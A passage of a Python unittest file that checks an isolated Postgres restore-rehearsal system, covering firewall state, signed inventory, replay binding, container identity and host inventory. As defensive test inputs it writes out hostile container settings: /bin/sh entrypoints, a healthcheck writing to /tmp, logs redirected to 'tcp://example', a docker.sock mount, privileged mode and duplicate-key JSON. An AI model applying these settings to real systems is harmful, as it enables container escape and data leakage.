            with self.assertRaises(GenerationError):
                validate_owned_metadata(
                    uid=values[0],
                    mode=values[1],
                    expected_kind="file",
                    is_symlink=values[2],
                )

    def test_preexisting_state_is_rejected(self) -> None:
        with self.assertRaises(GenerationError):
            validate_exclusive_target(exists=True, is_symlink=False)
        with self.assertRaises(GenerationError):
            validate_exclusive_target(exists=False, is_symlink=True)

    def test_descriptor_swap_is_rejected(self) -> None:
        original = canonical_json({"generation": "A"})
        swapped = canonical_json({"generation": "B"})
        with self.assertRaises(GenerationError):
            parse_descriptor_owned_bytes(
                original,
                swapped,
                uid=0,
                mode=stat.S_IFREG | 0o600,
            )

    def test_projected_state_is_immutable_after_packet_mutation(self) -> None:
        packet = generation_state().__dict__.copy()
        raw = canonical_json(packet)
        parsed, digest = parse_descriptor_owned_bytes(
            raw,
            raw,
            uid=0,
            mode=stat.S_IFREG | 0o600,
        )
        state = project_state(parsed)
        parsed["generation"] = "C"
        self.assertEqual(state.generation, "A")
        self.assertEqual(digest, sha256_bytes(raw))


class IsolationMeasurementTests(unittest.TestCase):
    def setUp(self) -> None:
        self.now = datetime(2026, 7, 31, 8, 0, tzinfo=timezone.utc)
        self.owner_cidr = "203.0.113.10/32"
        self.server = {
            "id": 123,
            "name": "pg-restore-a",
            "labels": {
                "purpose": "postgres-restore-rehearsal",
                "generation": "A",
            },
            "private_net": [],
            "public_net": {
                "ipv4": {},
                "ipv6": {},
                "floating_ips": [],
                "firewalls": [{"id": 456, "status": "applied"}],
            },
        }
        self.operation = canonical_operation_request(
            generation="A",
            phase="PRE_SQL",
            target_container_id="d" * 64,
            target_image_identity_sha256="e" * 64,
            nonce=b"N" * 32,
            requested_at=self.now,
        )
        self.firewall = {
            "id": 456,
            "name": "pg-restore-locked",
            "applied_to": [{"type": "server", "server": {"id": 123}}],
            "rules": expected_locked_rules(self.owner_cidr),
        }

    def test_current_locked_state_is_sanitized(self) -> None:
        packet = evaluate_provider_state(
            self.server,
            [self.firewall],
            generation="A",
            observed_at=self.now,
            owner_ssh_cidr=self.owner_cidr,
            operation=self.operation,
        )
        self.assertEqual(packet["status"], "LOCKED_CURRENT")
        self.assertNotIn("id", packet)
        self.assertEqual(packet["private_networks_attached"], 0)
        validate_locked_measurement(packet, "A", self.now)

    def test_private_network_attachment_shapes_fail_without_value_leak(self) -> None:
        attacks = (
            {},
            {"private_net": None},
            {"private_net": {}},
            {"private_net": [{"network": 991, "ip": "10.0.0.2"}]},
            {"private_net": [{"network": 991}, {"network": 992}]},
            {"private_net": [], "private_networks": [{"id": 991}]},
        )
        for replacement in attacks:
            server = {**self.server, **replacement}
            if "private_net" not in replacement:
                server.pop("private_net", None)
            with self.subTest(replacement=replacement):
                with self.assertRaises(ProviderInventoryError) as raised:
                    evaluate_provider_state(
                        server,
                        [self.firewall],
                        generation="A",
                        observed_at=self.now,
                        owner_ssh_cidr=self.owner_cidr,
                        operation=self.operation,
                    )
                self.assertNotIn("991", str(raised.exception))
                self.assertNotIn("10.0.0.2", str(raised.exception))

    def test_missing_extra_or_pending_firewall_is_rejected(self) -> None:
        with self.assertRaises(ProviderInventoryError):
            evaluate_provider_state(
                self.server,
                [],
                generation="A",
                observed_at=self.now,
                owner_ssh_cidr=self.owner_cidr,
                operation=self.operation,
            )
        selector = {
            **self.firewall,
            "applied_to": [
                *self.firewall["applied_to"],
                {"type": "label_selector", "label_selector": {"selector": "x=y"}},
            ],
        }
        with self.assertRaises(ProviderInventoryError):
            evaluate_provider_state(
                self.server,
                [selector],
                generation="A",
                observed_at=self.now,
                owner_ssh_cidr=self.owner_cidr,
                operation=self.operation,
            )
        server = {
            **self.server,
            "public_net": {
                "ipv4": {},
                "ipv6": {},
                "floating_ips": [],
                "firewalls": [
                    {"id": 456, "status": "applied"},
                    {"id": 789, "status": "pending"},
                ]
            },
        }
        with self.assertRaises(ProviderInventoryError):
            evaluate_provider_state(
                server,
                [self.firewall],
                generation="A",
                observed_at=self.now,
                owner_ssh_cidr=self.owner_cidr,
                operation=self.operation,
            )

    def test_stale_wrong_generation_or_host_measurement_is_rejected(self) -> None:
        packet = evaluate_provider_state(
            self.server,
            [self.firewall],
            generation="A",
            observed_at=self.now,
            owner_ssh_cidr=self.owner_cidr,
            operation=self.operation,
        )
        with self.assertRaises(GenerationError):
            validate_locked_measurement(packet, "B", self.now)
        with self.assertRaises(GenerationError):
            validate_locked_measurement(packet, "A", self.now + timedelta(minutes=3))
        policy = ProviderPolicy(
            collector_id="company-os-hetzner-locked-inventory",
            collector_version=2,
            collector_sha256=str(packet["collector_sha256"]),
            public_key_pem="unused",
            public_key_pem_sha256="0" * 64,
            owner_ssh_cidr_sha256=sha256_bytes(self.owner_cidr.encode()),
            account_context_sha256="1" * 64,
            provider_target_config_sha256="2" * 64,
            max_age_seconds=30,
        )
        with self.assertRaises(GenerationError):
            validate_locked_measurement(packet, "A", self.now, "f" * 64, policy)

    def test_unapproved_provider_manifest_stops(self) -> None:
        manifest = json.loads(
            (SCRIPTS / "postgres_restore_provider_manifest.json").read_text(
                encoding="utf-8"
            )
        )
        with self.assertRaises(GenerationError):
            load_provider_policy(manifest)

    def test_operation_packet_is_single_use_and_cross_binding_replay_fails(self) -> None:
        packet = evaluate_provider_state(
            self.server,
            [self.firewall],
            generation="A",
            observed_at=self.now,
            owner_ssh_cidr=self.owner_cidr,
            operation=self.operation,
        )
        public_key = "-----BEGIN PUBLIC KEY-----\nunused\n-----END PUBLIC KEY-----\n"
        manifest = canonical_json(
            {
                "schema_version": 3,
                "status": "APPROVED",
                "collector_id": "company-os-hetzner-locked-inventory",
                "collector_version": 2,
                "collector_sha256": sha256_bytes(
                    (SCRIPTS / "postgres_restore_provider_inventory.py").read_bytes()
                ),
                "broker_id": "company-os-hetzner-inventory-broker",
                "broker_version": 1,
                "signature_algorithm": "ed25519",
                "public_key_pem": public_key,
                "public_key_pem_sha256": sha256_bytes(public_key.encode()),
                "owner_ssh_cidr_sha256": sha256_bytes(self.owner_cidr.encode()),
                "account_context_sha256": "1" * 64,
                "provider_target_config_sha256": "2" * 64,
                "max_age_seconds": 30,
            }
        )
        consumed: set[str] = set()
        measured = evaluate_collected_packet(
            canonical_json(packet),
            manifest,
            operation=self.operation,
            now=self.now,
            server_ref_sha256=sha256_bytes(b"123"),
            consumed_operations=consumed,
        )
        self.assertEqual(
            measured["operation_binding_sha256"],
            sha256_bytes(canonical_json(self.operation)),
        )
        with self.assertRaises(IsolationGateError):
            evaluate_collected_packet(
                canonical_json(packet),
                manifest,
                operation=self.operation,
                now=self.now,
                server_ref_sha256=sha256_bytes(b"123"),
                consumed_operations=consumed,
            )
        for field, value in (
            ("phase", "POST_SQL"),
            ("generation", "B"),
            ("target_container_id_sha256", "f" * 64),
        ):
            replay = {**self.operation, field: value}
            with self.assertRaises(IsolationGateError):
                evaluate_collected_packet(
                    canonical_json(packet),
                    manifest,
                    operation=replay,
                    now=self.now,
                    server_ref_sha256=sha256_bytes(b"123"),
                    consumed_operations=set(),
                )

    def test_broker_signature_request_and_freshness_are_bound(self) -> None:
        request = canonical_json({"operation": self.operation})
        signed = {
            "schema_version": 1,
            "broker_id": "company-os-hetzner-inventory-broker",
            "broker_version": 1,
            "request_sha256": sha256_bytes(request),
            "observed_at": self.now.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "server": self.server,
            "firewalls": [self.firewall],
            "account_context_sha256": "1" * 64,
        }
        response = canonical_json(
            {**signed, "signature_base64": "c2lnbmF0dXJl"}
        )
        manifest = {
            "broker_id": "company-os-hetzner-inventory-broker",
            "broker_version": 1,
            "public_key_pem": "pinned",
            "account_context_sha256": "1" * 64,
        }
        verified: list[bytes] = []

        def verify(payload: bytes, signature: bytes, public_key: bytes) -> None:
            verified.extend((payload, signature, public_key))

        server, firewalls, observed, digest = evaluate_broker_response(
            response,
            request,
            manifest,
            now=self.now,
            verify=verify,
        )
        self.assertEqual(server, self.server)
        self.assertEqual(firewalls, [self.firewall])
        self.assertEqual(observed, self.now)
        self.assertRegex(digest, r"^[0-9a-f]{64}$")
        self.assertEqual(verified[0], canonical_json(signed))
        for attack_request, attack_now in (
            (canonical_json({"operation": "replacement"}), self.now),
            (request, self.now + timedelta(seconds=11)),
        ):
            with self.assertRaises(ProviderInventoryError):
                evaluate_broker_response(
                    response,
                    attack_request,
                    manifest,
                    now=attack_now,
                    verify=verify,
                )

    def test_caller_packet_and_collector_substitution_paths_are_absent(self) -> None:
        source = (SCRIPTS / "postgres_restore_isolation_gate.py").read_text(
            encoding="utf-8"
        )
        self.assertNotIn('f"generation-{generation}.json"', source)
        self.assertIn('f"/proc/self/fd/{collector_descriptor}"', source)
        self.assertIn("*capability_descriptors", source)
        self.assertIn('"--operation-request-fd"', source)
        self.assertIn("O_EXCL | os.O_NOFOLLOW", source)
        collector = (SCRIPTS / "postgres_restore_provider_inventory.py").read_text(
            encoding="utf-8"
        )
        self.assertNotIn(".bind(", collector)
        self.assertNotIn(".listen(", collector)
        self.assertNotIn(".accept(", collector)
        self.assertNotIn("socket.", collector)
        self.assertNotIn("hcloud-readonly-token", collector)
        self.assertNotIn("TOKEN_PATH", collector)
        self.assertIn("def broker_response(", collector)

    def test_operation_request_is_read_from_the_inherited_descriptor(self) -> None:
        with tempfile.NamedTemporaryFile(delete=False) as handle:
            path = Path(handle.name)
            handle.write(b'{"schema_version":1}\n')
        try:
            path.chmod(0o600)
            descriptor = open(path, "rb", buffering=0)
            try:
                actual = provider_inventory.os.fstat(descriptor.fileno())
                metadata = list(actual)
                metadata[0] = stat.S_IFREG | 0o600
                # st_uid as well. secure_read_fd() requires uid 0, and leaving
                # the real uid in place only passed because Windows reports 0
                # for every file. On POSIX the simulated descriptor has to
                # claim uid 0 or this never exercises the success path.
                metadata[4] = 0
                with (
                    patch.object(
                        provider_inventory.os,
                        "geteuid",
                        return_value=0,
                        create=True,
                    ),
                    patch.object(
                        provider_inventory.os,
                        "fstat",
                        return_value=provider_inventory.os.stat_result(metadata),
                    ),
                ):
                    self.assertEqual(
                        secure_read_fd(
                            descriptor.fileno(), "provider operation request"
                        ),
                        '{"schema_version":1}',
                    )
            finally:
                descriptor.close()
        finally:
            path.unlink()


class RunnerLifecycleTests(unittest.TestCase):
    def setUp(self) -> None:
        self.manifest = approved_runner_manifest()
        self.environment = runner_environment()
        self.container = runner_container()
        self.runner_image = image_objects()[0]
        self.target = target_container()
        self.target_image = image_objects()[1]

    def validate_target(
        self,
        container: dict[str, object],
        *,
        target_kind: str = "final",
        expected_running: bool = True,
        expected_network: str = "pg-rehearsal",
    ) -> dict[str, object]:
        expected_name = (
            "adapteng-recover-a" if target_kind == "recovery" else "adapteng-db-a"
        )
        return validate_target_container(
            container,
            self.target_image,
            self.manifest,
            "A",
            target_kind,
            expected_id="d" * 64,
            expected_name=expected_name,
            expected_volume="adapteng-restore-a",
            expected_pgdata="/var/lib/postgresql/data",
            expected_running=expected_running,
            expected_network=expected_network,
        )

    def test_runner_manifest_remains_fail_closed_until_reviewed(self) -> None:
        manifest = json.loads(
            (SCRIPTS / "postgres_restore_runner_manifest.json").read_text(
                encoding="utf-8"
            )
        )
        self.assertEqual(manifest["status"], "NOT_CONFIGURED")
        with self.assertRaises(GenerationError):
            require_approved_manifest(manifest, "runner manifest")

    def test_database_secret_is_exact_and_never_emits_password(self) -> None:
        payload = canonical_json(
            {
                "schema_version": 1,
                "generation": "A",
                "runner_password": "A" * 48,
                "admin_password": "B" * 48,
            }
        )
        validated = parse_database_secret(
            payload, self.manifest, "A", "probe", "final"
        )
        self.assertEqual(validated.environment["PGHOST"], "adapteng-db-a")
        self.assertNotEqual(
            validated.public_identity_sha256,
            sha256_bytes(validated.environment["PGPASSWORD"].encode()),
        )
        recovery_secret = parse_database_secret(
            payload, self.manifest, "A", "assert-recovery", "recovery"
        )
        self.assertEqual(recovery_secret.environment["PGUSER"], "postgres")
        self.assertEqual(recovery_secret.environment["PGPASSWORD"], "B" * 48)
        for attack in (
            payload.replace(b'"generation":"A"', b'"generation":"B"'),
            payload[:-2] + b',"PGHOST":"adapteng-ops-db"}\n',
            payload.replace(b"A" * 48, b"short", 1),
        ):
            with self.assertRaises(RunnerError):
                parse_database_secret(
                    attack, self.manifest, "A", "probe", "final"
                )

    def test_exact_created_runner_is_measured(self) -> None:
        measured = validate_runner_inspection(
            self.container,
            self.runner_image,
            self.manifest,
            expected_id="runner-id",
            expected_name="adapteng-runner-a-probe",
            entrypoint=str(self.manifest["psql_entrypoint"]),
            argv=list(self.manifest["probe_argv"]),
            environment=self.environment,
        )
        self.assertEqual(measured["container_id_sha256"], sha256_bytes(b"runner-id"))

    def test_measured_and_executing_container_id_must_match(self) -> None:
        with self.assertRaises(RunnerError):
            validate_runner_inspection(
                {**self.container, "Id": "replacement"},
                self.runner_image,
                self.manifest,
                expected_id="runner-id",
                expected_name="adapteng-runner-a-probe",
                entrypoint=str(self.manifest["psql_entrypoint"]),
                argv=list(self.manifest["probe_argv"]),
                environment=self.environment,
            )

    def test_runner_writable_layer_must_remain_empty(self) -> None:
        def clean_run(
            *_args: object, **_kwargs: object
        ) -> subprocess.CompletedProcess[bytes]:
            return subprocess.CompletedProcess([], 0, stdout=b"", stderr=b"")

        require_pristine_rootfs("runner-id", run=clean_run)

        def changed_run(
            *_args: object, **_kwargs: object
        ) -> subprocess.CompletedProcess[bytes]:
            return subprocess.CompletedProcess(
                [], 0, stdout=b"C /usr/local/libexec\n", stderr=b""
            )

        with self.assertRaises(RunnerError):
            require_pristine_rootfs("runner-id", run=changed_run)

    def test_tag_image_entrypoint_cmd_and_post_measure_mutation_are_rejected(self) -> None:
        attacks = [
            {**self.container, "Config": {**self.container["Config"], "Image": "tag"}},
            {
                **self.container,
                "Config": {**self.container["Config"], "Entrypoint": ["/bin/sh"]},
            },
            {**self.container, "Config": {**self.container["Config"], "Cmd": ["-c"]}},
        ]
        original = container_execution_identity(self.container)
        for attack in attacks:
            with self.subTest():
                with self.assertRaises(RunnerError):
                    validate_runner_inspection(
                        attack,
                        self.runner_image,
                        self.manifest,
                        expected_id="runner-id",
                        expected_name="adapteng-runner-a-probe",
                        entrypoint=str(self.manifest["psql_entrypoint"]),
                        argv=list(self.manifest["probe_argv"]),
                        environment=self.environment,
                    )
                self.assertNotEqual(container_execution_identity(attack), original)
        changed = {
            **self.container,
            "NetworkSettings": {
                "Networks": {
                    "pg-rehearsal": {
                        "NetworkID": "changed",
                        "EndpointID": "runner-endpoint",
                        "Aliases": ["adapteng-runner-a-probe"],
                    }
                }
            },
        }
        with self.assertRaises(RunnerError):
            require_unchanged_execution_identity(
                self.container, changed, "runner container"
            )

    def test_runner_rejects_healthcheck_and_external_logging(self) -> None:
        for section, field, value in (
            ("Config", "Healthcheck", {"Test": ["CMD-SHELL", "id"]}),
            (
                "HostConfig",
                "LogConfig",
                {"Type": "syslog", "Config": {"syslog-address": "tcp://example"}},
            ),
        ):
            attack = json.loads(json.dumps(self.container))
            attack[section][field] = value
            with self.subTest(field=field):
                with self.assertRaisesRegex(
                    RunnerError, "identity/command/isolation is not exact"
                ) as caught:
                    validate_runner_inspection(
                        attack,
                        self.runner_image,
                        self.manifest,
                        expected_id="runner-id",
                        expected_name="adapteng-runner-a-probe",
                        entrypoint=str(self.manifest["psql_entrypoint"]),
                        argv=list(self.manifest["probe_argv"]),
                        environment=self.environment,
                    )
                self.assertNotIn("tcp://example", str(caught.exception))

    def test_production_manifest_loaders_accept_only_sealed_health_log_policy(
        self,
    ) -> None:
        manifest = approved_runner_manifest()
        raw = canonical_json(manifest)
        with patch.object(
            restore_runner, "secure_member_bytes", return_value=raw
        ):
            loaded, _ = restore_runner.load_manifest()
        self.assertIsNone(loaded["target"]["healthcheck"])
        self.assertEqual(
            loaded["target"]["log_config"],
            {"Type": "json-file", "Config": {}},
        )
        with patch.object(
            restore_generation, "read_secured_once", return_value=raw
        ):
            target, _ = restore_generation.load_target_policy(generation_state())
        self.assertEqual(target, manifest["target"])
        duplicate = raw.replace(
            b'"healthcheck":null,',
            b'"healthcheck":null,"healthcheck":{"Test":["CMD","id"]},',
            1,
        )
        with patch.object(
            restore_runner, "secure_member_bytes", return_value=duplicate
        ):
            with self.assertRaisesRegex(RunnerError, "duplicate key"):
                restore_runner.load_manifest()

        for section, field, value in (
            ("target", "healthcheck", {"Test": ["CMD", "id"]}),
            (
                "target",
                "log_config",
                {"Type": "gelf", "Config": {}},
            ),
            ("runner", "healthcheck", {"Test": ["CMD-SHELL", "id"]}),
            (
                "runner",
                "log_config",
                {"Type": "json-file", "Config": {"max-size": "1m"}},
            ),
        ):
            attack = json.loads(json.dumps(manifest))
            destination = attack["target"] if section == "target" else attack
            destination[field] = value
            attack_raw = canonical_json(attack)
            with self.subTest(section=section, field=field):
                with patch.object(
                    restore_runner,
                    "secure_member_bytes",
                    return_value=attack_raw,
                ):
                    with self.assertRaises(RunnerError):
                        restore_runner.load_manifest()
                if section == "target":
                    with patch.object(
                        restore_generation,
                        "read_secured_once",
                        return_value=attack_raw,
                    ):
                        with self.assertRaises(GenerationError):
                            restore_generation.load_target_policy(generation_state())

    def test_target_validation_binds_image_command_and_container_id(self) -> None:
        measured = self.validate_target(self.target)
        self.assertEqual(measured["container_id"], "d" * 64)
        attacks = [
            {**self.target, "Image": "sha256:" + "9" * 64},
            {
                **self.target,
                "Config": {**self.target["Config"], "Entrypoint": ["/bin/sh"]},
            },
            {**self.target, "Path": "/bin/sh"},
            {
                **self.target,
                "Config": {**self.target["Config"], "Cmd": ["attacker"]},
            },
            {**self.target, "Id": ""},
            {**self.target, "RestartCount": 1},
            {
                **self.target,
                "HostConfig": {
                    **self.target["HostConfig"],
                    "Privileged": True,
                },
            },
            {
                **self.target,
                "HostConfig": {
                    **self.target["HostConfig"],
                    "CapAdd": ["SYS_ADMIN"],
                },
            },
        ]
        for attack in attacks:
            with self.assertRaises(RunnerError):
                self.validate_target(attack)

    def test_healthcheck_and_log_redirection_fail_before_target_start(self) -> None:
        baseline = target_container(running=False)
        self.validate_target(
            baseline,
            expected_running=False,
            expected_network="pg-rehearsal",
        )
        attacks = [
            (
                "Healthcheck",
                {
                    "Test": ["CMD-SHELL", "id >/tmp/unapproved-healthcheck"],
                    "Interval": 1,
                    "Timeout": 1,
                    "StartPeriod": 0,
                    "Retries": 1,
                },
            ),
            ("Healthcheck", {"Test": ["CMD", "id"]}),
            ("Healthcheck", {"Test": ["NONE"], "Future": 1}),
        ]
        for field, value in attacks:
            attack = json.loads(json.dumps(baseline))
            attack["Config"][field] = value
            with self.subTest(field=field, value=value):
                with self.assertRaisesRegex(
                    RunnerError, "identity/command/isolation is not exact"
                ) as caught:
                    self.validate_target(
                        attack,
                        expected_running=False,
                        expected_network="pg-rehearsal",
                    )
                self.assertNotIn("unapproved-healthcheck", str(caught.exception))
                with self.assertRaises(ExporterError):
                    container_capability_record(attack, self.target_image)
        for driver in ("syslog", "gelf", "fluentd", "splunk", "awslogs"):
            attack = json.loads(json.dumps(baseline))
            attack["HostConfig"]["LogConfig"] = {
                "Type": driver,
                "Config": {"endpoint": "attacker"},
            }
            with self.subTest(driver=driver):
                with self.assertRaises(RunnerError):
                    self.validate_target(
                        attack,
                        expected_running=False,
                        expected_network="pg-rehearsal",
                    )
                with self.assertRaises(ExporterError):
                    container_capability_record(attack, self.target_image)
        nested = json.loads(json.dumps(baseline))
        nested["HostConfig"]["LogConfig"] = {
            "Type": "json-file",
            "Config": {"Future": {"nested": "value"}},
        }
        with self.assertRaises(RunnerError):
            self.validate_target(
                nested,
                expected_running=False,
                expected_network="pg-rehearsal",
            )
        post_start = json.loads(json.dumps(baseline))
        post_start["Config"]["Healthcheck"] = {"Test": ["CMD-SHELL", "id"]}
        with self.assertRaises(RunnerError):
            require_unchanged_execution_identity(
                baseline, post_start, "target container"
            )
        for payload in (
            b'[{"Config":{"Healthcheck":null,"Healthcheck":{"Test":["CMD","id"]}}}]',
            b'[{"HostConfig":{"LogConfig":{"Type":"syslog","Type":"json-file",'
            b'"Config":{}}}}]',
            b'[{"HostConfig":{"LogConfig":{"Type":"json-file","Config":{'
            b'"Future":{"nested":{"deeper":"value"}}}}}}]',
            b'[{"HostConfig":{"LogConfig":{"Type":"json-file","Config":{'
            b'"key":"\\u0000"}}}}]',
            b"NaN",
            b"1e999",
        ):
            with self.assertRaises(HostInventoryError):
                value = strict_docker_json(payload)
                container_execution_identity(value[0])

    def test_stopped_final_peer_remains_on_none_during_recovery_assertion(self) -> None:
        peer = json.loads(json.dumps(self.target))
        peer["State"] = target_container(running=False)["State"]
        peer["NetworkSettings"]["Networks"] = {
            "none": {
                "NetworkID": "",
                "EndpointID": "",
                "Aliases": None,
                "IPAddress": "",
            }
        }
        measured = self.validate_target(
            peer,
            expected_running=False,
            expected_network="none",
        )
        self.assertEqual(measured["container_id"], "d" * 64)
        with self.assertRaises(RunnerError):
            self.validate_target(
                peer,
                expected_running=False,
            )

    def test_runner_source_never_uses_docker_run_or_second_create(self) -> None:
        text = (SCRIPTS / "postgres_restore_runner.py").read_text(encoding="utf-8")
        self.assertNotIn('"run",', text)
        self.assertEqual(text.count('"create",'), 1)
        self.assertIn('["docker", "start", container_id]', text)
        self.assertIn('["docker", "attach", container_id]', text)
        self.assertLess(
            text.index('["docker", "start", container_id]'),
            text.index('["docker", "attach", container_id]'),
        )
        guard = (SCRIPTS / "postgres_restore_guard.py").read_text(encoding="utf-8")
        self.assertIn("args.recovery_container_id", guard)
        self.assertNotIn(
            'docker_json("container", "inspect", names["recovery_container"])',
            guard,
        )

    def test_complete_target_measurement_precedes_only_id_start(self) -> None:
        events: list[object] = []
        pristine = {
            "container_id": "d" * 64,
            "running": False,
            "state_status": "created",
            "entrypoint": "approved",
        }

        def inspect_target(**kwargs: object) -> dict[str, object]:
            running = bool(kwargs["running"])
            events.append(("inspect", running, kwargs["container_id"]))
            return {
                **pristine,
                "running": running,
                "state_status": "running" if running else "created",
            }

        def collect_provider(**kwargs: object) -> dict[str, object]:
            events.append(("provider", kwargs["container_id"], kwargs["phase"]))
            return {"operation_binding_sha256": "a" * 64}

        def start(command: list[str]) -> None:
            events.append(tuple(command))

        authorize_and_start_target(
            state=generation_state(),
            target_policy=dict(self.manifest["target"]),
            container_id="d" * 64,
            container_name="adapteng-recover-a",
            phase="TARGET_START_RECOVERY",
            consumed_operations=set(),
            inspect_target=inspect_target,
            collect_provider=collect_provider,
            start=start,
        )
        self.assertEqual(
            events,
            [
                ("inspect", False, "d" * 64),
                ("provider", "d" * 64, "TARGET_START_RECOVERY"),
                ("inspect", False, "d" * 64),
                ("docker", "start", "d" * 64),
                ("inspect", True, "d" * 64),
            ],
        )

        events.clear()
        inspections = iter(
            [
                pristine,
                {**pristine, "entrypoint": "attacker"},
            ]
        )

        def swapped_inspect(**kwargs: object) -> dict[str, object]:
            events.append(("inspect", kwargs["running"]))
            return next(inspections)

        with self.assertRaises(GenerationError):
            authorize_and_start_target(
                state=generation_state(),
                target_policy=dict(self.manifest["target"]),
                container_id="d" * 64,
                container_name="adapteng-recover-a",
                phase="TARGET_START_RECOVERY",
                consumed_operations=set(),
                inspect_target=swapped_inspect,
                collect_provider=collect_provider,
                start=start,
            )
        self.assertFalse(any(event == ("docker", "start", "d" * 64) for event in events))

    def test_role_lifecycle_and_command_allowlist_are_exact(self) -> None:
        self.assertIn(
            b"CREATE ROLE postgres_restore_runner",
            role_lifecycle_sql("bootstrap-role", "A" * 48),
        )
        self.assertEqual(
            role_lifecycle_sql("drop-role", "unused"),
            b"DROP ROLE postgres_restore_runner;\n",
        )
        with self.assertRaises(RunnerError):
            command_for_mode(self.manifest, "unknown")


class HostInventoryTests(unittest.TestCase):
    def setUp(self) -> None:
        self.runner = runner_container()
        self.target = target_container()
        self.expected = {
            "adapteng-runner-a-probe": container_execution_identity(self.runner),
            "adapteng-db-a": container_execution_identity(self.target),
        }
        manifest = approved_runner_manifest()
        self.expected_images = {
            (str(manifest["config_id"]), str(manifest["repo_digest"])),
            (
                str(manifest["target"]["config_id"]),
                str(manifest["target"]["repo_digest"]),
            ),
        }
        self.volumes = [{"Name": "adapteng-restore-a"}]

    def validate(self, containers: list[dict[str, object]]) -> dict[str, object]:
        return validate_host_inventory(
            containers=containers,
            images=image_objects(),
            networks=network_objects(),
            volumes=self.volumes,
            expected_containers=self.expected,
            expected_images=self.expected_images,
            expected_network="pg-rehearsal",
            expected_volume="adapteng-restore-a",
            forbidden_identifiers={"adapteng-ops-db", "postgres-adapteng-ops"},
            generation="A",
            stage="PRE_SQL",
            observed_at=datetime(2026, 7, 31, 8, 0, tzinfo=timezone.utc),
        )

    def test_exact_live_host_inventory_is_digest_bound(self) -> None:
        packet = self.validate([self.runner, self.target])
        self.assertEqual(packet["status"], "HOST_ISOLATION_CURRENT")
        self.assertEqual(packet["production_identifiers_found"], 0)

    def test_extra_stopped_or_running_container_is_rejected(self) -> None:
        for running in (False, True):
            extra = {
                **target_container(container_id=f"extra-{running}"),
                "Name": "/unapproved",
                "State": {"Running": running},
            }
            with self.assertRaises(HostInventoryError):
                self.validate([self.runner, self.target, extra])

    def test_extra_alias_port_volume_network_and_socket_are_rejected(self) -> None:
        attacks: list[tuple[str, object]] = []
        alias = json.loads(json.dumps(self.target))
        alias["NetworkSettings"]["Networks"]["pg-rehearsal"]["Aliases"].append(
            "adapteng-ops-db"
        )
        attacks.append(("container", alias))
        port = json.loads(json.dumps(self.target))
        port["HostConfig"]["PortBindings"] = {"5432/tcp": [{"HostPort": "5432"}]}
        attacks.append(("container", port))
        socket = json.loads(json.dumps(self.target))
        socket["Mounts"].append(
            {
                "Type": "bind",
                "Source": "/var/run/docker.sock",
                "Destination": "/var/run/docker.sock",
                "RW": True,
            }
        )
        attacks.append(("container", socket))
        for _, attack in attacks:
            with self.assertRaises(HostInventoryError):
                self.validate([self.runner, attack])
        with self.assertRaises(HostInventoryError):
            validate_host_inventory(
                containers=[self.runner, self.target],
                images=image_objects(),
                networks=[
                    *network_objects(),
                    {
                        "Name": "extra",
                        "Internal": False,
                        "Driver": "bridge",
                        "Scope": "local",
                    },
                ],
                volumes=self.volumes,
                expected_containers=self.expected,
                expected_images=self.expected_images,
                expected_network="pg-rehearsal",
                expected_volume="adapteng-restore-a",
                forbidden_identifiers={"adapteng-ops-db"},
                generation="A",
                stage="PRE_SQL",
                observed_at=datetime.now(timezone.utc),
            )
        with self.assertRaises(HostInventoryError):
            validate_host_inventory(
                containers=[self.runner, self.target],
                images=image_objects(),
                networks=network_objects(),
                volumes=[*self.volumes, {"Name": "extra"}],
                expected_containers=self.expected,
                expected_images=self.expected_images,
                expected_network="pg-rehearsal",
                expected_volume="adapteng-restore-a",
                forbidden_identifiers={"adapteng-ops-db"},
                generation="A",
                stage="PRE_SQL",
                observed_at=datetime.now(timezone.utc),
            )

    def test_target_swap_after_guard_is_rejected(self) -> None:
        changed = json.loads(json.dumps(self.target))
        changed["Id"] = "replacement-db"
        with self.assertRaises(HostInventoryError):
            self.validate([self.runner, changed])


class RecoveryEvidenceTests(unittest.TestCase):
    def test_extra_fields_do_not_mask_missing_required_evidence(self) -> None:
        evidence = {
            "runner_manifest_sha256": "a" * 64,
            "database_target_identity_sha256": "b" * 64,
            "runner_exit": "0",
        }
        with self.assertRaises(GenerationError):
            validate_recovery_evidence(evidence)


class ProbeAndStatusTests(unittest.TestCase):
    def test_probe_substitution_and_noop_are_rejected(self) -> None:
        probe = (SCRIPTS / "postgres_restore_transaction_probe.sql").read_bytes()
        expected = sha256_bytes(probe)
        self.assertEqual(verify_probe_payload(probe, expected), expected)
        for replacement in (b"SELECT 1;\n", probe + b"\n-- substituted\n"):
            with self.assertRaises(ProbeError):
                verify_probe_payload(replacement, expected)

    def test_exact_status_output_with_exit_9_is_rejected(self) -> None:
        def fake_run(*_args: object, **_kwargs: object) -> subprocess.CompletedProcess[str]:
            return subprocess.CompletedProcess([], 9, stdout="exact\n", stderr="")

        with self.assertRaises(StatusGateError):
            execute_status_gate("exact", ["007=exact"], "B", "0" * 64, run=fake_run)

    def test_status_without_measured_runner_evidence_is_rejected(self) -> None:
        def fake_run(*_args: object, **_kwargs: object) -> subprocess.CompletedProcess[str]:
            return subprocess.CompletedProcess([], 0, stdout="exact\n", stderr="")

        with self.assertRaises(StatusGateError):
            execute_status_gate("exact", ["007=exact"], "B", "0" * 64, run=fake_run)


class CapabilityInventoryTests(unittest.TestCase):
    def setUp(self) -> None:
        self.full_job = {
            "timer_name": "adapteng-pgbackrest-full.timer",
            "service_name": "adapteng-pgbackrest-full.service",
            "timer_path": "/etc/systemd/system/adapteng-pgbackrest-full.timer",
            "service_path": "/etc/systemd/system/adapteng-pgbackrest-full.service",
            "timer_sha256": "1" * 64,
            "service_sha256": "2" * 64,
            "on_calendar": "Sun *-*-* 02:00:00 UTC",
            "exec_path": "/usr/bin/pgbackrest",
            "exec_sha256": "3" * 64,
            "argv": [
                "--config=/etc/pgbackrest/pgbackrest.conf",
                "--stanza=adapteng-ops",
                "--repo=1",
                "--type=full",
                "backup",
            ],
            "systemd_properties": {
                "User": "adapteng-pgbackrest-backup",
                "Group": "adapteng-pgbackrest-backup",
                "LoadCredentialEncrypted": "pgbackrest-repository-write",
            },
        }
        self.scheduler = [{"source_type": "systemd", "identity": "apt"}]
        self.containers = [{"image": "reviewed", "entrypoint": ["/init"], "cmd": []}]
        self.processes: list[dict[str, object]] = []
        self.capability = {
            "allowed_scheduler_sources": [
                record_sha256(self.scheduler[0])
            ],
            "allowed_containers": [record_sha256(self.containers[0])],
            "allowed_writer_processes": [],
        }

    def test_direct_exact_full_job_is_required(self) -> None:
        validate_job_policy(self.full_job, "full")
        attacks = [
            {**self.full_job, "exec_path": "/bin/sh"},
